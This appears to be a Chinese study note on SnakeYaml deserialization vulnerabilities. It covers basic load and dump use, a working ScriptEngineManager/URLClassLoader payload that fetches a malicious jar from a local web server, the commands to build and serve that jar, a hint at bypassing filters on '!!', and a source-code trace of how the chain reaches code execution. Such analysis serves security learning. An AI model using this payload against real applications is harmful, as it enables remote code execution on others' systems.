# 0x01 What Is SnakeYaml

SnakeYaml是一个完整的YAML1.1规范Processor，用于解析YAML，序列化以及反序列化，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型。

# 0x02 Best Practice

```xml
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.27</version>
</dependency>
```

两个方法：

- Yaml.load()：入参是一个字符串或者一个文件，返回一个Java对象
- Yaml.dump()：将一个对象转化为yaml文件形式

## dump

```java
import com.demo.User;
import org.yaml.snakeyaml.Yaml;

public class SnakeYamlDemo {
    public static void main(String[] args) {
        User user = new User();
        user.setName("Taco");
        Yaml yaml = new Yaml();
        System.out.println(yaml.dump(user));
    }
}
```

> !!com.demo.User {name: Taco}
>
> **!!**用于强制类型转换，与fastjson中@type字段类似

## load

```java
package com.demo;

public class User {
    private String name;

    public User(){
        System.out.println("NonArg Constructor");
    }

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }

    @Override
    public String toString() {
        return "My name is " + name;
    }
}
```

```java
import com.demo.User;
import org.yaml.snakeyaml.Yaml;

public class SnakeYamlDemo {
    public static void main(String[] args) {
        Yaml yaml = new Yaml();
        String s = "!!com.demo.User {name: Taco}";
        User user = yaml.load(s);
        System.out.println(user);
    }
}
```

> NonArg Constructor
> setName
> My name is Taco

调用了无参构造器和`setter`

> 注意：若类属性是public修饰，不会调用对应的setter方法，而是通过反射来set

# 0x03 Way To Attack

yaml反序列化时可以通过`!!`+全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造`ScriptEngineManager`payload并利用SPI机制通过`URLClassLoader`或者其他payload如JNDI方式远程加载实例化恶意类从而实现任意代码执行。

Github上面的EXP：https://github.com/artsploit/yaml-payload

> javac src/artsploit/AwesomeScriptEngineFactory.java
>
> jar -cvf yaml-payload.jar -C src/ .

将生成yaml-payload.jar包放在web服务上

`python -m http.server 9999`

> !!javax.script.ScriptEngineManager [
>  !!java.net.URLClassLoader [[
>   !!java.net.URL ["http://127.0.0.1:9999/yaml-payload.jar"]
>  ]]
> ]

![image-20230123142111909](../.gitbook/assets/image-20230123142111909.png)

# 0x04 Deep Source

## ScriptEngineManager

![image-20230123143300458](../.gitbook/assets/image-20230123143300458.png)

![image-20230123143314631](../.gitbook/assets/image-20230123143314631.png)

`ScriptEngineManager`的无参构造器调用了init()，进行初始化设置后调用`initEngines()`，接着到`getServiceLoader`

![image-20230123144053760](../.gitbook/assets/image-20230123144053760.png)

到了熟悉的`ServiceLoader.load()`返回一个`ServiceLoader<>`，根据这个可以获取一个迭代器，接下来还是熟悉的迭代遍历。

![image-20230123144716480](../.gitbook/assets/image-20230123144716480.png)

`next() => nextService()`会加载接口实现类并实例化。

## Yaml#load()

```java
public <T> T load(String yaml) {
	return (T) loadFromReader(new StreamReader(yaml), Object.class);
}
```

payload存储于StreamReader的stream字段

![image-20230123145718466](../.gitbook/assets/image-20230123145718466.png)

回到`loadFromReader()`，创建了一个Composer对象，并封装到`constructor`中

```java
private Object loadFromReader(StreamReader sreader, Class<?> type) {
    Composer composer = new Composer(new ParserImpl(sreader), resolver, loadingConfig);
    constructor.setComposer(composer);
    return constructor.getSingleData(type);
}
```

跟进`getSingleData`

![image-20230123150505342](../.gitbook/assets/image-20230123150505342.png)

`getSingleNode()`将poc改造为如下：

> <org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:javax.script.ScriptEngineManager, value=[<org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:java.net.URLClassLoader, value=[<org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:seq, value=[<org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:java.net.URL, value=[<org.yaml.snakeyaml.nodes.ScalarNode (tag=tag:yaml.org,2002:str, value=http://127.0.0.1:9999/yaml-payload.jar)>])>])>])>])>

若过滤了`!!`，可利用此tag规则进行绕过

接着调用`constructDocument()`对上面poc进行处理

![image-20230123150825914](../.gitbook/assets/image-20230123150825914.png)

跟进`constructObject()` => `constructObjectNoCheck()`

![image-20230123151057596](../.gitbook/assets/image-20230123151057596.png)

node放入`recursiveObjects`，进入`constructor.construct(node)`

![image-20230123151206835](../.gitbook/assets/image-20230123151206835.png)

![image-20230123151433908](../.gitbook/assets/image-20230123151433908.png)

遍历节点，调用`constructObject()`又循环回去了

> constructObjectNoCheck()->
> BaseConstructor#construct()->
> Contructor#construct()->
> 迭代Contructor#constructObject()

上面的POC有5个node，所以循环5次。

先后进行了URL、URLClassLoader、ScriptEngineManager的实例化

注意这里实例化是有传参数(argumentList)的，把前一个类的实例化对象当作下个类构造器的参数。

最后进入ScriptEngineManager的无参构造器，连接上了上文的SPI机制。

![image-20230123153625236](../.gitbook/assets/image-20230123153625236.png)

# Article To Learn

[跳跳糖社区-SnakeYaml反序列化及不出网利用](https://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247496898&idx=1&sn=9df9a236a3c437522bdf125cf92c6e24&chksm=c172e553f6056c4592696a15d5270e30386a229ca35d8eb1cf588498c95d78b28f2766975234&scene=27&key=7917b196593e1041903cc963f4d8e8dd309fc34822ec523c96ef6852b6eb00243ae09c3a475f21000c466a1481f5d9ef88661e5ccd3eae00b654271eecd790081cf9cb2b874e0566a9b1bf83ab3e3a9dffbce029a9983bd1e617a34873e1a5cf0d90ff63073904c1c64a7ab0832fd5396612ac69385a93896810c27b3466f6ca&ascene=0&uin=MzM0MTE3MTk2MQ%3D%3D&devicetype=Windows+10+x64&version=6308011a&lang=zh_CN&exportkey=n_ChQIAhIQk1l7Og6o32ldfRBgt0m%2F7xLgAQIE97dBBAEAAAAAAFyoNDyY7FgAAAAOpnltbLcz9gKNyK89dVj0STE6v0lILRu1tKDn0ZDKVMzBwrLXZCB%2BmUzHXSOZsIYr0w0A%2FcuvTqwms4Rt%2Fkjpf8zHxxTi8IwvjYn%2FDZ9Q33Hc5vfX2hilkR53helcExsLrLyslL%2FWBsef9XI%2F6wZMWmG6oy8JJGplsmLrW%2BxqvmnB4f5wILv176CzXoS3esuvsQ%2BhfcDKd%2FEfu5bUKYhs0ZoGh1vCyZD6VtP9NEg2tTCVHV3tJAqerIo%2BgJoEHIoL7rOFzs%2Fq0qic&acctmode=0&pass_ticket=Q7%2FiUlx9i6XS%2FNSi17wpXoqBYZHAHgY0basv8D4BZIN%2BCoAkTfFeOqqNDBcbXW05phWaLHgqOHGN8cecKlsdgw%3D%3D&wx_header=1&fontgear=2)

不出网和其他利用后面学习其他知识之后再来补充